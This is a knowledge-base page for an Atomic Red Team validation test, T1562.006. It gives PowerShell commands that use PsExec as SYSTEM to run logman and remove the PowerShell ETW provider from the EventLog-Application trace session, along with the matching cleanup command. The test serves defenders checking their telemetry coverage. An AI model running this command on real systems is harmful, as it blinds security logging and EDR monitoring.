---
atomic_guid: "6f118276-121d-4c09-bb58-a8fb4a72ee84"
title: "Disable Powershell ETW Provider - Windows"
framework: "atomic"
generated: "true"
attack_technique_id: "T1562.006"
attack_technique_name: "Impair Defenses: Indicator Blocking"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.006/T1562.006.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "6f118276-121d-4c09-bb58-a8fb4a72ee84"
  - "Disable Powershell ETW Provider - Windows"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Disable Powershell ETW Provider - Windows

This test was created to disable the Microsoft Powershell ETW provider by using the built-in Windows tool, logman.exe. This provider is used as a common source of telemetry in AV/EDR solutions.

## Metadata

- Atomic GUID: 6f118276-121d-4c09-bb58-a8fb4a72ee84
- Technique: T1562.006: Impair Defenses: Indicator Blocking
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1562.006/T1562.006.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1562-impair_defenses|T1562.006]]

## Input Arguments

### provider

- description: The provider to disable.
- type: string
- default: Microsoft-Windows-Powershell

### ps_exec_location

- description: Location of PSExec.
- type: string
- default: PathToAtomicsFolder\..\ExternalPayloads\pstools\PsExec.exe

### session

- description: The session to disable.
- type: string
- default: EventLog-Application

## Dependencies

PSExec must be installed on the machine.

### Prerequisite Check

```powershell
if (Test-Path "#{ps_exec_location}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PStools.zip"
expand-archive -literalpath "PathToAtomicsFolder\..\ExternalPayloads\PStools.zip" -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\pstools" -force
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
cmd /c "#{ps_exec_location}" -accepteula -i -s cmd.exe /c logman update trace "#{session}" --p "#{provider}" -ets
```

### Cleanup

```powershell
cmd /c "#{ps_exec_location}" -i -s cmd.exe /c logman update trace "#{session}" -p "#{provider}" -ets
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.006/T1562.006.yaml)
